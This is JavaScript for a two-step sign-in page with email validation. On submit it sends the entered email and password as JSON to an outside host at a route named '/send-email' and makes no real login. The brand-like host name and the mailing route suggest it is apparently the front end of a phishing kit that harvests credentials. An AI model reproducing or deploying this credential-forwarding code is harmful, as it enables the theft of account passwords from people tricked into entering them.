const continueBtn = document.querySelector(".continue-btn");
const passwordDiv = document.querySelector(".password-div");
const emailDiv = document.querySelector(".email-div");
const socialDiv = document.querySelector(".social-div");
const emailLastDiv = document.querySelector('.email-last-div')
const email = document.querySelector('#email')
const errorEmail = document.querySelector('.error-email')
const goBackLink = document.querySelector(".go-back-link");

// continueBtn.addEventListener("click", (e) => {
//   e.preventDefault();
//   console.log(email.value);
//   console.log()
//   if(!email.value) {
//     email.style.border = ".9px rgb(201, 58, 26) solid";
//     errorEmail.textContent = "Please enter a valid email address.";
//   } else {
//   emailDiv.classList.add("hide");
//   passwordDiv.classList.remove("hide");
//   socialDiv.classList.add("hide");
//   emailLastDiv.classList.add("hide")
//   }
// });

continueBtn.addEventListener("click", (e) => {
  e.preventDefault();

  // Get the value of the email input
  const userEmail = email.value.trim(); // Trim to remove any leading or trailing whitespace

  // Regular expression for email validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  // Check if the email is empty or not valid
  if (!userEmail || !emailRegex.test(userEmail)) {
    email.style.border = ".9px rgb(201, 58, 26) solid";
    errorEmail.textContent = "Please enter a valid email address.";
    return; // Prevent further processing if email is not valid
  }

  // If the email is valid, proceed to the password page
  emailDiv.classList.add("hide");
  passwordDiv.classList.remove("hide");
  socialDiv.classList.add("hide");
  emailLastDiv.classList.add("hide");
});



goBackLink.addEventListener('click', () => {
     emailDiv.classList.remove("hide");
     passwordDiv.classList.add("hide");
     socialDiv.classList.remove("hide");
     emailLastDiv.classList.remove("hide");
})






// api 



// Define the API endpoint
const apiUrl = "https://hotpad-backend.onrender.com";
const form = document.querySelector('form')
const errorPassword = document.querySelector('.error-password')
const password = document.querySelector('#password')
const signInButton = document.querySelector('.sign-in-button')
// Define the API
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  

  // Get user input for email and password
  const userEmail = document.getElementById("email").value;
  const userPassword = document.getElementById("password").value;

    if (!userPassword) {
      password.style.border = ".9px rgb(201, 58, 26) solid";
      errorPassword.textContent = "Please enter a password.";
      
      return; // Prevent further processing
    }

    signInButton.innerText = "Loading...";
    signInButton.style.backgroundColor = "gray";
    signInButton.disabled = true;


  // Define function to send the login credentials
  try {
    // Make the HTTP POST request to the API endpoint
    const response = await fetch(`${apiUrl}/send-email`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email: userEmail, password: userPassword }),
    });
    console.log(response);

    // Check if the request was successful (status code 2xx)
    if (response.ok) {
      // Parse the response JSON data
      const responseData = await response.json();
      // Handle successful login, such as redirecting the user to another page
    } else {
      // If the response status is not in the 2xx range, handle the error
      console.error("Error logging in:", response.statusText);
      // Handle login failure, such as displaying an error message to the user
    }
  } catch (error) {
    // If an error occurs during the request, handle it
    console.error("Error logging in:", error);
    // Handle login failure, such as displaying an error message to the user
  }
});
